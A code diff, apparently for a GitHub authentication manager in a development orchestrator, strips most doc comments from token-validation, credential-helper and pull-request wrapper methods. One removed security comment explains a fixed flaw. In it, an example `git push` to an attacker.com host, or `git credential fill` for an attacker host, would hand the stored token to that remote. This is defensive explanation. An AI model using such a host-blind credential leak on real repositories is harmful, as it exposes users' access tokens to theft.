@@ -5,7 +5,6 @@ import type { CredentialStore } from "./credential-store.js";
 import { getErrorMessage } from "../shared/utils.js";
 import { setGitIdentity, setGlobalCredentialHelper, clearGlobalCredentialHelper, CONTAINER_CREDENTIAL_HELPER } from "./git-config.js";
 import { GitHubAppTokenMinter, type AppTokenMintResult } from "./github-app-token.js";
-// Sub-module imports — delegated implementations
 import { createRepo as createRepoImpl, listUserRepos as listUserReposImpl, searchRepos as searchReposImpl, checkRepoWriteAccess as checkRepoWriteAccessImpl, listOrgs as listOrgsImpl } from "./github-auth-repos.js";
 import { createPullRequest as createPullRequestImpl, findPullRequest as findPullRequestImpl, findPullRequestAnyState as findPullRequestAnyStateImpl, mergePullRequest as mergePullRequestImpl, mergePullRequestAttempt as mergePullRequestAttemptImpl, findPullRequestByNumber as findPullRequestByNumberImpl, enableAutoMerge as enableAutoMergeImpl, disableAutoMerge as disableAutoMergeImpl, updatePullRequest as updatePullRequestImpl, addPullRequestComment as addPullRequestCommentImpl, addLabelsToPullRequest as addLabelsToPullRequestImpl, removeLabelFromPullRequest as removeLabelFromPullRequestImpl, markPullRequestReady as markPullRequestReadyImpl, listPullRequests as listPullRequestsImpl, viewPullRequest as viewPullRequestImpl, viewPullRequestResult as viewPullRequestResultImpl, viewPullRequestConversation as viewPullRequestConversationImpl, getPullRequestNodeId as getPullRequestNodeIdImpl } from "./github-auth-prs.js";
 import type { PullRequestDetail, PrConversation, PrListState, ListPullRequestsResult, MergeAttempt, TerminalPrFacts } from "./github-auth-prs.js";
@@ -33,17 +32,6 @@ export interface GitHubAuthStatus {
   avatarUrl?: string;
 }
 
-/**
- * Snapshot of GitHub API rate-limit state. Updated after every GraphQL call.
- * The poller reads this to decide whether to skip its next tick; the UI
- * surfaces a banner with a countdown to `resetAt` so users understand why
- * status updates have paused.
- *
- * `limited` flips to true on 403/429 responses, on `retry-after` headers,
- * and on 200 responses that carry `errors[].type === "RATE_LIMITED"` or
- * `"SECONDARY_RATE_LIMITED"`. It flips back to false on the next successful
- * call after `resetAt`, or immediately when a clean 200 lands.
- */
 export interface GitHubRateLimitState {
   limited: boolean;
   /** Epoch ms when the limit is expected to clear, or `null` if unknown. */
@@ -61,11 +49,6 @@ export interface GitHubRepoResult {
   message?: string;
 }
 
-/**
- * Validates a GitHub PAT by calling the GitHub API.
- * Returns user info on success, null on failure.
- */
-/** User profile returned by a successful `GET /user`. */
 export interface GitHubUserInfo {
   username: string;
   avatarUrl: string;
@@ -73,31 +56,11 @@ export interface GitHubUserInfo {
   displayName: string | null;
 }
 
-/**
- * Result of probing a token against `GET /user`. The three states are
- * deliberately distinct so callers never conflate "GitHub says this token is
- * bad" with "GitHub didn't answer":
- *
- *   - `valid`        — 200 with a user profile; the token works.
- *   - `invalid`      — 401; GitHub explicitly rejected the credential.
- *   - `indeterminate`— anything else (5xx, 403/429 rate-limit, network error,
- *                      DNS failure, timeout, a GitHub outage status page). The
- *                      token's validity is *unknown*; it must NOT be cleared on
- *                      this signal, or a GitHub outage would silently log every
- *                      user out.
- */
 export type GitHubTokenCheck =
   | { status: "valid"; user: GitHubUserInfo }
   | { status: "invalid" }
   | { status: "indeterminate"; detail: string };
 
-/**
- * Probe a token against `GET /user` and classify the outcome. This is the
- * primitive callers should use when an answer of "couldn't tell" must be
- * handled differently from "definitely bad" — most importantly, before
- * clearing a stored token. Only an explicit HTTP 401 proves the token is
- * invalid; everything else is `indeterminate` and the token is preserved.
- */
 export async function checkGitHubToken(token: string): Promise<GitHubTokenCheck> {
   let res: Response;
   try {
@@ -109,8 +72,6 @@ export async function checkGitHubToken(token: string): Promise<GitHubTokenCheck>
       },
     });
   } catch (err) {
-    // Network failure, DNS, TLS, timeout — we never reached GitHub, so the
-    // token's state is unknown. Preserve it.
     return { status: "indeterminate", detail: `network error: ${getErrorMessage(err)}` };
   }
   if (res.ok) {
@@ -120,21 +81,12 @@ export async function checkGitHubToken(token: string): Promise<GitHubTokenCheck>
       user: { username: data.login, avatarUrl: data.avatar_url, id: data.id, displayName: data.name },
     };
   }
-  // 401 is the ONLY status that proves the credential itself is bad. 403/429
-  // are rate-limit / abuse responses, 5xx is a GitHub-side outage, and any
-  // other status is unexpected — none of them mean "this token is invalid",
-  // so we report `indeterminate` and leave the stored token in place.
+  // Only a 401 from /user justifies clearing the token.
   if (res.status === 401) return { status: "invalid" };
   return { status: "indeterminate", detail: `HTTP ${res.status}` };
 }
 
-/**
- * Backwards-compatible thin wrapper around {@link checkGitHubToken} that
- * returns the user profile on success and `null` otherwise. Use this only when
- * the caller genuinely treats "invalid" and "couldn't reach GitHub" the same
- * way (e.g. populating optional profile fields). When a `null` would lead to
- * *clearing* a token, call `checkGitHubToken` instead and branch on the state.
- */
+// Use checkGitHubToken before clearing a token; null here includes network errors.
 export async function validateGitHubToken(token: string): Promise<GitHubUserInfo | null> {
   const result = await checkGitHubToken(token);
   return result.status === "valid" ? result.user : null;
@@ -146,12 +98,6 @@ export class GitHubAuthManager extends EventEmitter {
   private _avatarUrl: string | null = null;
   private credentialStore: CredentialStore;
   private workspaceDir: string;
-  /**
-   * Mints short-lived, repo-scoped GitHub App installation tokens (docs/172
-   * Gap 2-R / planning#81). Inert until an operator supplies App credentials, in
-   * which case {@link mintRepoScopedToken} becomes the broker's preferred
-   * credential source over the long-lived PAT.
-   */
   private appTokenMinter: GitHubAppTokenMinter;
   private _rateLimit: GitHubRateLimitState = {
     limited: false,
@@ -174,32 +120,11 @@ export class GitHubAuthManager extends EventEmitter {
     return this._token !== null;
   }
 
-  /**
-   * Check if a token file exists and load it into memory.
-   * Returns true if credentials were found.
-   *
-   * Resolution order:
-   *   1. `CredentialStore` (disk file). This is the persisted token written
-   *      when the user goes through the OAuth flow in the UI.
-   *   2. `process.env.GITHUB_TOKEN`. Used in dogfooding (ShipIt-in-ShipIt
-   *      local mode), where the outer orchestrator forwards its own token
-   *      to the inner orchestrator via `x-shipit-secrets` —
-   *      `platform:github_token`. The inner container has no `/credentials`
-   *      mount, so env is the only path.
-   *
-   * Env-sourced tokens are NOT persisted back to disk: env is the source of
-   * truth in local mode and the outer's token rotation should be picked up
-   * on the next `checkCredentials()` rather than masked by a stale on-disk
-   * copy.
-   */
+  // Do not persist the environment fallback: a disk copy would mask token rotation.
   checkCredentials(): boolean {
     const diskToken = this.credentialStore.getGithubToken();
     if (diskToken) {
       this._token = diskToken;
-      // Rewrite the global credential helper on every boot. The orchestrator
-      // process may have started before any session was active, so this is
-      // the only place that guarantees the global helper matches the stored
-      // token after a restart (or after a token-rotate that crashed mid-write).
       try { setGlobalCredentialHelper(diskToken); } catch (err) {
         console.error("[github-auth] Failed to install global credential helper on boot:", err);
       }
@@ -214,17 +139,10 @@ export class GitHubAuthManager extends EventEmitter {
       return true;
     }
     this._token = null;
-    // No token — make sure the global helper isn't left over from a previous
-    // boot. Otherwise stale credentials silently authenticate git operations
-    // until they're rejected by the remote.
     try { clearGlobalCredentialHelper(); } catch { /* nothing to clear */ }
     return false;
   }
 
-  /**
-   * Validate and store a GitHub PAT. Configures git credentials on success.
-   * Emits "auth_complete" on success, "auth_failed" on failure.
-   */
   async setToken(token: string): Promise<boolean> {
     const trimmed = token.trim();
     if (!trimmed) {
@@ -234,9 +152,6 @@ export class GitHubAuthManager extends EventEmitter {
 
     const check = await checkGitHubToken(trimmed);
     if (check.status !== "valid") {
-      // Distinguish a rejected token from an unreachable GitHub so the user
-      // knows whether to fix their token or just retry once the outage clears.
-      // Either way we don't store an unverified token.
       const message =
         check.status === "invalid"
           ? "Invalid GitHub token"
@@ -249,36 +164,24 @@ export class GitHubAuthManager extends EventEmitter {
     this._username = check.user.username;
     this._avatarUrl = check.user.avatarUrl;
 
-    // Persist token
     this.credentialStore.setGithubToken(trimmed);
 
-    // Install the credential helper *globally* so every workspace
-    // (orchestrator-side and every session container — both inherit
-    // `GIT_CONFIG_GLOBAL=/credentials/.gitconfig`) picks up the new token
-    // without needing a per-workspace backfill. The legacy per-session
-    // backfill in `setGitHubToken` still runs as defense-in-depth, but
-    // this is the line that fixes warm sessions created while the token
-    // was temporarily cleared — those don't appear in `list()` and so
-    // were never backfilled before.
     try { setGlobalCredentialHelper(trimmed); } catch (err) {
       console.error("[github-auth] Failed to install global credential helper:", err);
     }
 
-    // Set global git identity from GitHub profile
     this.setGitIdentityFromGitHub(check.user);
 
     this.emit("auth_complete");
     return true;
   }
 
-  /** Set global git identity from GitHub user info. */
   private setGitIdentityFromGitHub(info: { username: string; displayName: string | null; id: number }): void {
     const gitName = info.displayName ?? info.username;
     const gitEmail = `${info.id}+${info.username}@users.noreply.github.com`;
     setGitIdentity(gitName, gitEmail);
   }
 
-  /** Get current authentication status. */
   getStatus(): GitHubAuthStatus {
     return {
       authenticated: this._token !== null,
@@ -287,178 +190,54 @@ export class GitHubAuthManager extends EventEmitter {
     };
   }
 
-  /**
-   * Get the raw GitHub PAT. Used by the GitHub Issues route and the GitHub
-   * service layer to build authenticated API calls. Most callers should
-   * prefer task-specific helpers (e.g. `createPullRequest`) that use the
-   * token internally — this getter exists only for callers that need the raw
-   * value. Returns `null` if no token is configured.
-   *
-   * Note: this token is NOT forwarded into compose services. docs/184 removed
-   * the `source: platform:github_token` compose-forwarding path.
-   */
   getToken(): string | null {
     return this._token;
   }
 
-  /**
-   * Whether short-lived, repo-scoped GitHub App installation tokens are
-   * available (docs/172 Gap 2-R / planning#81). When true the credential broker
-   * prefers a minted installation token over the long-lived PAT, shrinking the
-   * blast radius of an extracted credential to a single repo and a bounded TTL.
-   * False on every deployment that hasn't configured a GitHub App — those fall
-   * back to the PAT broker path unchanged.
-   */
   appTokensEnabled(): boolean {
     return this.appTokenMinter.isConfigured();
   }
 
-  /**
-   * Mint (or return a cached) short-lived installation token scoped to a single
-   * repo, for the credential broker. Returns null when App tokens aren't
-   * configured or minting fails — the broker then falls back to the PAT so git
-   * never hard-fails for lack of an installation token. See
-   * {@link GitHubAppTokenMinter}.
-   */
   async mintRepoScopedToken(owner: string, repo: string): Promise<string | null> {
     return this.appTokenMinter.getRepoToken(owner, repo);
   }
 
-  /**
-   * Mint a **read-only**, single-repo installation token, keeping the reason a
-   * failed mint failed (docs/262 reqs 7, 10, 13).
-   *
-   * This is the plugin-repository path. A plugin declaration is a standing
-   * grant to fetch that repository and nothing more, so the token ShipIt mints
-   * for it carries `contents: read` and cannot push — the read-only checkout of
-   * req 7 is then a property of the credential, not of nobody calling
-   * `git push`. And a plugin repository is a *different* repository from the
-   * session's own, so "the App is not installed there" is a real, nameable
-   * state that the project being authorized says nothing about.
-   */
   async mintReadOnlyRepoToken(owner: string, repo: string): Promise<AppTokenMintResult> {
     return this.appTokenMinter.getRepoTokenResult(owner, repo, "read");
   }
 
-  /**
-   * Point a workspace repo's *local* `.git/config` at the brokering
-   * `shipit-git-credential` helper so push/pull resolve the token at git-time
-   * instead of embedding it.
-   *
-   * SECURITY (docs/172 Gap 2 / planning#74): this method used to write an inline
-   * shell helper — `!f() { echo "password=<PAT>"; … }; f` — into the local
-   * config. That was wrong in two compounding ways:
-   *   1. The literal `ghp_…` token landed in plaintext in `/workspace/.git/config`,
-   *      which is agent-readable inside the session container (a plain file read
-   *      leaks it — no git invocation needed).
-   *   2. The inline helper was host-blind: it echoed the token for *any* host git
-   *      fed it, so `git push https://attacker.com/…` (or `git credential fill`
-   *      for an attacker host) handed the PAT to an arbitrary remote. It also
-   *      *shadowed* the host-aware broker that the container's global gitconfig
-   *      already installs, since a local helper is consulted alongside the global
-   *      one.
-   *
-   * The fix routes the workspace through the same {@link CONTAINER_CREDENTIAL_HELPER}
-   * the container's global gitconfig uses ({@link writeContainerGitConfig}). The
-   * broker resolves the token over localhost at git-time and only for the
-   * configured GitHub host (see `getGitCredential`) — never echoing it for
-   * other hosts and never writing it to disk.
-   *
-   * Both git execution contexts stay correct:
-   *   - In the container, the local helper *is* the broker → host-aware, token-free.
-   *   - On the orchestrator, the global inline helper (set by `setGlobalCredentialHelper`,
-   *     which always runs whenever a token exists) is consulted first and fills
-   *     the credential, so the broker path — which doesn't exist on the
-   *     orchestrator host — is never invoked. Push/pull to github.com is
-   *     unaffected.
-   *
-   * `--replace-all` is used so a workspace that still carries a pre-fix inline
-   * token helper (or any duplicate entries) is remediated to the single broker
-   * value on the next configure call.
-   *
-   * @param targetDir - Optional directory to configure. Defaults to the instance's workspaceDir.
-   */
   configureGitCredentials(targetDir?: string): void {
     if (!this._token) return;
 
     const cwd = targetDir ?? this.workspaceDir;
-    // Backfill (setGitHubToken) iterates every persisted session, including ones
-    // whose on-disk checkout has been reclaimed (archive / disk-janitor) while
-    // metadata is retained. Running `git config` with a non-existent cwd makes
-    // spawnSync fail to chdir and surface a misleading "spawnSync git ENOENT"
-    // (path: 'git') that looks like git is missing. Skip cleanly instead.
+    // Session metadata can outlive a reclaimed checkout.
     if (!existsSync(cwd)) return;
     try {
-      // docs/266 — as root this would both execute the tree's own config and
-      // leave `.git/config` owned by root inside a worker-owned `.git`, which
-      // breaks the agent's in-container `git config` on the next turn. Drop to
-      // the tree's owner: the file we are writing is one that user owns anyway.
       execFileSync(
         "git",
         gitArgsWithHooksDisabled(["config", "--replace-all", "credential.helper", CONTAINER_CREDENTIAL_HELPER]),
         { cwd, stdio: "pipe", ...gitSpawnOverridesForTree(cwd) },
       );
-      // User identity is inherited from global git config (set by setToken/loadUserInfo).
     } catch (err) {
       console.error("[github-auth] Failed to configure git credentials:", err);
     }
   }
 
-  /** Clear stored token, git config, and in-memory state. */
   clearCredentials(): void {
     this._token = null;
     this._username = null;
     this._avatarUrl = null;
     this.credentialStore.clearGithubToken();
-    // Drop the global credential helper too — otherwise the file at
-    // `/credentials/.gitconfig` keeps echoing the now-revoked token to
-    // every git operation in every workspace until a fresh token arrives.
     try { clearGlobalCredentialHelper(); } catch (err) {
       console.error("[github-auth] Failed to clear global credential helper:", err);
     }
   }
 
-  /**
-   * Mark the current token as invalid — the orchestrator just got a
-   * "Authentication failed" / "Invalid username or token" back from a git
-   * push, fetch, or pull. Verifies the token against `GET /user` first via
-   * `checkGitHubToken`, which separates "GitHub says the token is bad" from
-   * "GitHub didn't answer". We clear credentials and emit `token_invalid`
-   * (so the SSE layer wired in `app-lifecycle.ts` can push the new auth
-   * state to every client and surface a toast) ONLY on an explicit 401.
-   * A still-valid token (repo-specific scope failure) and an indeterminate
-   * result (5xx / rate-limit / network error / GitHub outage) both preserve
-   * the credential and return `false`. Also returns `false` (without
-   * emitting) when no token is stored — that keeps the call idempotent if
-   * multiple git operations fail at once.
-   *
-   * The verification step is what stops a single per-repo 401 — or a
-   * GitHub-wide outage — from dropping a working token: the original PR #506
-   * cleared on the first git auth error, which (combined with the over-broad
-   * `isGitAuthError` match before that was tightened) wiped freshly-added
-   * tokens whenever a stale workspace clone couldn't authenticate. The
-   * indeterminate branch closes the remaining gap where the verification
-   * call itself failed for reasons unrelated to the token (an outage takes
-   * down both the git operation and `GET /user`), which used to clear it.
-   *
-   * Calling this is preferable to plain `clearCredentials()` because it
-   * gives the UI a reason string ("auto-push failed: …") to display, and
-   * because the SSE broadcast is gated on the event — without it the
-   * client would have to poll `/api/bootstrap` to discover the auth state
-   * changed.
-   */
   async markTokenInvalid(reason: string): Promise<boolean> {
     const token = this._token;
     if (!token) return false;
-    // Verify the token against the GitHub API before clearing anything.
-    // `checkGitHubToken` distinguishes three outcomes, and only one of them
-    // justifies dropping the stored credential:
     const check = await checkGitHubToken(token);
     if (check.status === "valid") {
-      // A successful `GET /user` proves the token still works for the
-      // authenticated user even though a per-repo git operation failed —
-      // most often a fine-grained PAT whose repository scope doesn't include
-      // the failing repo. Preserve it.
       console.warn(
         `[github-auth] Git auth error (${reason}) — but token is still valid for ${check.user.username}; ` +
           `treating as repo-specific (e.g. fine-grained PAT scope), not clearing credentials`,
@@ -466,29 +245,18 @@ export class GitHubAuthManager extends EventEmitter {
       return false;
     }
     if (check.status === "indeterminate") {
-      // We couldn't reach GitHub to confirm (5xx, rate-limit, network error,
-      // or a GitHub outage). The git failure that triggered this could well
-      // be the *same* outage, so clearing the token now would log the user
-      // out for an external incident they didn't cause. Only the user may
-      // clear their token implicitly. Preserve it and let the next operation
-      // retry once GitHub recovers.
       console.warn(
         `[github-auth] Git auth error (${reason}) — could not verify token against GitHub ` +
           `(${check.detail}); preserving credentials (likely a transient GitHub outage)`,
       );
       return false;
     }
-    // check.status === "invalid": GitHub explicitly rejected the token (401).
     console.warn(`[github-auth] GitHub token invalidated (${reason}) — clearing credentials and notifying clients`);
     this.clearCredentials();
     this.emit("token_invalid", { reason });
     return true;
   }
 
-  /**
-   * Create a new GitHub repository via the API.
-   * Returns repo details on success, error message on failure.
-   */
   async createRepo(
     name: string,
     options: { description?: string; isPrivate?: boolean; owner?: string } = {},
@@ -499,19 +267,11 @@ export class GitHubAuthManager extends EventEmitter {
     return createRepoImpl(this._token, name, options);
   }
 
-  /**
-   * List the organizations the authenticated user belongs to (empty when
-   * unauthenticated). Backs the new-repo owner picker.
-   */
   async listOrgs(): Promise<{ login: string; avatarUrl: string }[]> {
     if (!this._token) return [];
     return listOrgsImpl(this._token);
   }
 
-  /**
-   * Create a pull request on GitHub.
-   * Returns the PR URL on success, or an error message.
-   */
   async createPullRequest(options: {
     owner: string;
     repo: string;
@@ -527,12 +287,6 @@ export class GitHubAuthManager extends EventEmitter {
     return createPullRequestImpl(this._token, options);
   }
 
-  /**
-   * Create an issue on `owner/repo` under the authenticated user's identity
-   * (docs/164 — user bug filing). Returns a `scopeError` flag when GitHub
-   * rejects for lack of Issues:write on the target repo so the caller can
-   * surface a reconnect prompt. No scope pre-check — the 403 is the gate.
-   */
   async createIssue(options: {
     owner: string;
     repo: string;
@@ -546,10 +300,6 @@ export class GitHubAuthManager extends EventEmitter {
     return createIssueImpl(this._token, options);
   }
 
-  /**
-   * List the authenticated user's repos, sorted by most recently pushed.
-   * Used to populate the repo selector before the user types a search query.
-   */
   async listUserRepos(): Promise<{
     fullName: string;
     description: string | null;
@@ -561,9 +311,6 @@ export class GitHubAuthManager extends EventEmitter {
     return listUserReposImpl(this._token);
   }
 
-  /**
-   * Search the user's accessible repos by name.
-   */
   async searchRepos(query: string): Promise<{
     fullName: string;
     description: string | null;
@@ -575,11 +322,6 @@ export class GitHubAuthManager extends EventEmitter {
     return searchReposImpl(this._token, query);
   }
 
-  /**
-   * docs/162 — whether the authenticated user can push to `owner/repo`.
-   * Returns `{ canWrite: false }` with a reason when unauthenticated or
-   * read-only, so the Ops fix-session spawn can fail clearly.
-   */
   async checkRepoWriteAccess(owner: string, repo: string): Promise<{ canWrite: boolean; reason?: string }> {
     if (!this._token) {
       return { canWrite: false, reason: "GitHub is not connected — cannot verify write access." };
@@ -587,10 +329,6 @@ export class GitHubAuthManager extends EventEmitter {
     return checkRepoWriteAccessImpl(this._token, owner, repo);
   }
 
-  /**
-   * Check if an open PR exists for the given head branch.
-   * Returns PR metadata if found, null otherwise.
-   */
   async findPullRequest(
     owner: string,
     repo: string,
@@ -600,10 +338,6 @@ export class GitHubAuthManager extends EventEmitter {
     return findPullRequestImpl(this._token, owner, repo, head);
   }
 
-  /**
-   * Check if a PR exists for the given head branch in any state (open, closed, merged).
-   * Used as a one-time catch-up probe after server restart to detect already-merged PRs.
-   */
   async findPullRequestAnyState(
     owner: string,
     repo: string,
@@ -617,23 +351,11 @@ export class GitHubAuthManager extends EventEmitter {
     return findPullRequestAnyStateImpl(this._token, owner, repo, head);
   }
 
-  /**
-   * Merge a pull request.
-   *
-   * Fetches the PR's title and body and forwards them as commit_title /
-   * commit_message so the squash/merge commit uses the PR's title and
-   * description rather than the repo's "Default commit message" setting
-   * (which on older repos concatenates every original commit message). If the
-   * PR-detail fetch fails, falls through to the merge with no commit_title
-   * override — preserves the previous behavior as a safety net.
-   */
   async mergePullRequest(
     owner: string,
     repo: string,
     pullNumber: number,
     method: "merge" | "squash" | "rebase" = "merge",
-    /** docs/287 req 16 — the head the caller's check gate actually examined.
-     * GitHub refuses the merge if the branch has moved past it. */
     expectedSha?: string,
   ): Promise<{ success: boolean; message: string }> {
     if (!this._token) return { success: false, message: "Not authenticated" };
@@ -650,17 +372,7 @@ export class GitHubAuthManager extends EventEmitter {
     );
   }
 
-  /** docs/287 req 9 — the same merge, reporting which of its three outcomes
-   * happened. The agent merge keeps or drops its claim on that distinction. */
-  /**
-   * `beforeSend` (docs/288 req 4) is asked immediately before the PUT, and it is
-   * there because of the `viewPullRequestImpl` above it: that read supplies the
-   * merge commit's title and body, and it is a full network round trip during
-   * which a caller's authorisation can be withdrawn. Without the hook the
-   * caller's last check has to sit before this whole method, which makes the
-   * uncancellable window a preparatory GET plus the merge instead of the merge
-   * alone. Returning a message refuses without sending anything.
-   */
+  // Recheck authorization after the preparatory GET, immediately before the merge.
   async mergePullRequestAttempt(
     owner: string,
     repo: string,
@@ -678,7 +390,6 @@ export class GitHubAuthManager extends EventEmitter {
     );
   }
 
-  /** docs/287 req 11 — the terminal-promotion facts, addressed by number. */
   async findPullRequestByNumber(
     owner: string,
     repo: string,
@@ -688,13 +399,6 @@ export class GitHubAuthManager extends EventEmitter {
     return findPullRequestByNumberImpl(this._token, owner, repo, pullNumber);
   }
 
-  /**
-   * Enable auto-merge on a pull request.
-   * Uses the GraphQL API since REST doesn't support auto-merge.
-   *
-   * The impl fetches the PR's title/body and forwards them as
-   * commitHeadline/commitBody — see `enableAutoMerge` in github-auth-prs.ts.
-   */
   async enableAutoMerge(
     owner: string,
     repo: string,
@@ -705,10 +409,6 @@ export class GitHubAuthManager extends EventEmitter {
     return enableAutoMergeImpl(this._token, owner, repo, pullNumber, method);
   }
 
-  /**
-   * Disable auto-merge on a pull request.
-   * Uses the GraphQL API (`disablePullRequestAutoMerge` mutation).
-   */
   async disableAutoMerge(
     owner: string,
     repo: string,
@@ -718,9 +418,6 @@ export class GitHubAuthManager extends EventEmitter {
     return disableAutoMergeImpl(this._token, owner, repo, pullNumber);
   }
 
-  /**
-   * Update an existing pull request (title, body, or state).
-   */
   async updatePullRequest(
     owner: string,
     repo: string,
@@ -731,9 +428,6 @@ export class GitHubAuthManager extends EventEmitter {
     return updatePullRequestImpl(this._token, owner, repo, pullNumber, options);
   }
 
-  /**
-   * Add a comment to a pull request (issue-style comment).
-   */
   async addPullRequestComment(
     owner: string,
     repo: string,
@@ -744,11 +438,6 @@ export class GitHubAuthManager extends EventEmitter {
     return addPullRequestCommentImpl(this._token, owner, repo, pullNumber, body);
   }
 
-  /**
-   * Add labels to a pull request (additive). Best-effort: returns
-   * `{ success: false, message }` rather than throwing so callers can degrade a
-   * label failure to a non-fatal warning without blocking the PR operation.
-   */
   async addLabelsToPullRequest(
     owner: string,
     repo: string,
@@ -759,12 +448,6 @@ export class GitHubAuthManager extends EventEmitter {
     return addLabelsToPullRequestImpl(this._token, owner, repo, pullNumber, labels);
   }
 
-  /**
-   * Remove a single label from a pull request. Best-effort, mirroring
-   * `addLabelsToPullRequest`: a label that isn't present (404) is treated as
-   * success (idempotent); other failures return `{ success: false, message }`
-   * rather than throwing.
-   */
   async removeLabelFromPullRequest(
     owner: string,
     repo: string,
@@ -775,9 +458,6 @@ export class GitHubAuthManager extends EventEmitter {
     return removeLabelFromPullRequestImpl(this._token, owner, repo, pullNumber, label);
   }
 
-  /**
-   * Mark a draft pull request as ready for review.
-   */
   async markPullRequestReady(
     owner: string,
     repo: string,
@@ -787,13 +467,6 @@ export class GitHubAuthManager extends EventEmitter {
     return markPullRequestReadyImpl(this._token, owner, repo, pullNumber);
   }
 
-  /**
-   * List pull requests for a repository.
-   *
-   * Reports a failed read rather than an empty list — including the missing
-   * token, which is a reason the repository could not be read, not evidence
-   * that it holds no pull requests.
-   */
   async listPullRequests(
     owner: string,
     repo: string,
@@ -804,9 +477,6 @@ export class GitHubAuthManager extends EventEmitter {
     return listPullRequestsImpl(this._token, owner, repo, state, limit);
   }
 
-  /**
-   * Fetch a single PR's details by number.
-   */
   async viewPullRequest(
     owner: string,
     repo: string,
@@ -816,12 +486,6 @@ export class GitHubAuthManager extends EventEmitter {
     return viewPullRequestImpl(this._token, owner, repo, pullNumber);
   }
 
-  /**
-   * Same read, distinguishing "no such PR" from "the read failed" (docs/255).
-   * `gh pr view` uses this so a 403/5xx never renders as "No pull request
-   * found"; the collapsing `viewPullRequest` above stays for callers that
-   * treat a failed read as "no extra info".
-   */
   async viewPullRequestResult(
     owner: string,
     repo: string,
@@ -831,11 +495,6 @@ export class GitHubAuthManager extends EventEmitter {
     return viewPullRequestResultImpl(this._token, owner, repo, pullNumber);
   }
 
-  /**
-   * Fetch a PR's conversation — issue comments, review submissions, and inline
-   * review threads (docs/255). Read-only; the write side of review threads
-   * lives in `services/github-pr-comments.ts`.
-   */
   async viewPullRequestConversation(
     owner: string,
     repo: string,
@@ -845,15 +504,11 @@ export class GitHubAuthManager extends EventEmitter {
     return viewPullRequestConversationImpl(this._token, owner, repo, pullNumber);
   }
 
-  /** Fetch the GraphQL node id for a pull request. */
   async getPullRequestNodeId(owner: string, repo: string, pullNumber: number): Promise<string | null> {
     if (!this._token) return null;
     return getPullRequestNodeIdImpl(this._token, owner, repo, pullNumber);
   }
 
-  /**
-   * Get CI check status for a PR's head commit.
-   */
   async getCheckStatus(
     owner: string,
     repo: string,
@@ -863,20 +518,11 @@ export class GitHubAuthManager extends EventEmitter {
     return getCheckStatusImpl(this._token, owner, repo, ref);
   }
 
-  /**
-   * docs/171 — read a published GitHub Release by tag for the inline release
-   * lifecycle card. Read-only; the write-side `createRelease` is Phase 4.
-   * Returns null when no Release exists for the tag yet.
-   */
   async getReleaseByTag(owner: string, repo: string, tag: string): Promise<ReleaseByTag | null> {
     if (!this._token) return null;
     return getReleaseByTagImpl(this._token, owner, repo, tag);
   }
 
-  /**
-   * Get check run annotations (structured failure details with file paths and line numbers).
-   * Returns empty array if not authenticated or if the API call fails.
-   */
   async getCheckRunAnnotations(
     owner: string,
     repo: string,
@@ -892,11 +538,6 @@ export class GitHubAuthManager extends EventEmitter {
     return getCheckRunAnnotationsImpl(this._token, owner, repo, checkRunId);
   }
 
-  /**
-   * Get raw job logs for a check run (fallback when annotations aren't available).
-   * Returns the last 100 lines of the log, or empty string on failure.
-   * Note: the check run databaseId maps to the job ID for GitHub Actions.
-   */
   async getJobLogs(
     owner: string,
     repo: string,
@@ -906,9 +547,6 @@ export class GitHubAuthManager extends EventEmitter {
     return getJobLogsImpl(this._token, owner, repo, jobId);
   }
 
-  // ---- GitHub Actions (backs `gh run`/`gh workflow`) ----
-
-  /** List workflow runs for a repo, most-recent first. */
   async listWorkflowRuns(
     owner: string,
     repo: string,
@@ -918,37 +556,26 @@ export class GitHubAuthManager extends EventEmitter {
     return listWorkflowRunsImpl(this._token, owner, repo, opts);
   }
 
-  /** Fetch a single workflow run by id (null when it doesn't exist). */
   async getWorkflowRun(owner: string, repo: string, runId: number): Promise<WorkflowRunSummary | null> {
     if (!this._token) return null;
     return getWorkflowRunImpl(this._token, owner, repo, runId);
   }
 
-  /** List the jobs for a workflow run. */
   async listWorkflowRunJobs(owner: string, repo: string, runId: number): Promise<WorkflowJobSummary[]> {
     if (!this._token) return [];
     return listWorkflowRunJobsImpl(this._token, owner, repo, runId);
   }
 
-  /** List the repo's workflow definitions. */
   async listWorkflows(owner: string, repo: string): Promise<WorkflowSummary[]> {
     if (!this._token) return [];
     return listWorkflowsImpl(this._token, owner, repo);
   }
 
-  /** Fetch a single workflow definition by numeric id or filename (null when missing). */
   async getWorkflow(owner: string, repo: string, idOrFile: string): Promise<WorkflowSummary | null> {
     if (!this._token) return null;
     return getWorkflowImpl(this._token, owner, repo, idOrFile);
   }
 
-  /**
-   * Re-run an existing workflow run (whole run, or just its failed jobs).
-   *
-   * Returns a status-bearing result rather than throwing so the service can map
-   * GitHub's 403 onto an actionable message. With no token the shape is the
-   * same, reported as a 401.
-   */
   async rerunWorkflowRun(
     owner: string,
     repo: string,
@@ -959,10 +586,6 @@ export class GitHubAuthManager extends EventEmitter {
     return rerunWorkflowRunImpl(this._token, owner, repo, runId, opts);
   }
 
-  /**
-   * Reply to an existing PR review thread (docs/102). `threadId` is the
-   * GraphQL node id of the thread (as surfaced on `PrReviewThread.id`).
-   */
   async addReviewThreadReply(
     threadId: string,
     body: string,
@@ -971,19 +594,16 @@ export class GitHubAuthManager extends EventEmitter {
     return addReviewThreadReplyImpl(this._token, threadId, body);
   }
 
-  /** Mark a PR review thread as resolved (docs/102). */
   async resolveReviewThread(threadId: string): Promise<{ success: boolean; message: string }> {
     if (!this._token) return { success: false, message: "Not authenticated with GitHub" };
     return resolveReviewThreadImpl(this._token, threadId);
   }
 
-  /** Reopen (unresolve) a previously-resolved review thread (docs/102). */
   async unresolveReviewThread(threadId: string): Promise<{ success: boolean; message: string }> {
     if (!this._token) return { success: false, message: "Not authenticated with GitHub" };
     return unresolveReviewThreadImpl(this._token, threadId);
   }
 
-  /** Submit a batch of line comments as one PR review (docs/102). */
   async submitPullRequestReview(
     pullRequestId: string,
     comments: PullRequestReviewThreadDraft[],
@@ -993,27 +613,10 @@ export class GitHubAuthManager extends EventEmitter {
     return submitPullRequestReviewImpl(this._token, pullRequestId, comments, body);
   }
 
-  /** Snapshot of the most recent rate-limit state seen on the GraphQL API. */
   getRateLimitState(): GitHubRateLimitState {
     return { ...this._rateLimit };
   }
 
-  /**
-   * Run a GraphQL query against the GitHub API.
-   * Returns the parsed JSON response body, or null if not authenticated.
-   *
-   * Rate-limit awareness: parses `x-ratelimit-*` and `retry-after` headers on
-   * every response and updates `_rateLimit`. Treats both transport-level
-   * rate limiting (HTTP 403/429) and GraphQL-level rate limiting (200 OK
